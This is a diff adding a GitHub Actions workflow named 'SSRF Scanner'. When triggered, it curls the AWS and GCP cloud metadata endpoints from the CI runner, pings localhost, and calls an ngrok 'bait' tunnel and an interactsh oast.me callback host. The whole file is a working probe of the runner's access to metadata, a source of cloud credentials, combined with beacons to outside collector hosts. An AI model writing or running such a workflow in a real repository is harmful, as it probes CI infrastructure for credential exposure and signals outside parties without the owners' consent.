@@ -1,0 +1,28 @@
+name: SSRF Scanner
+
+on:
+  workflow_dispatch:
+
+jobs:
+  ssrf-test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Curl AWS Metadata
+        run: |
+          curl http://169.254.169.254/latest/meta-data/ || true
+
+      - name: Curl GCP Metadata
+        run: |
+          curl http://metadata.google.internal || true
+
+      - name: Curl Localhost
+        run: |
+          ping -c 2 127.0.0.1 || true
+
+      - name: Curl Ngrok Bait
+        run: |
+          curl https://cd13e3febd7f.ngrok-free.app || true
+
+      - name: Curl Interactsh
+        run: |
+          curl https://d2anq5a9io6mpv2l55g0wxshdz9mzn8k4.oast.me || true
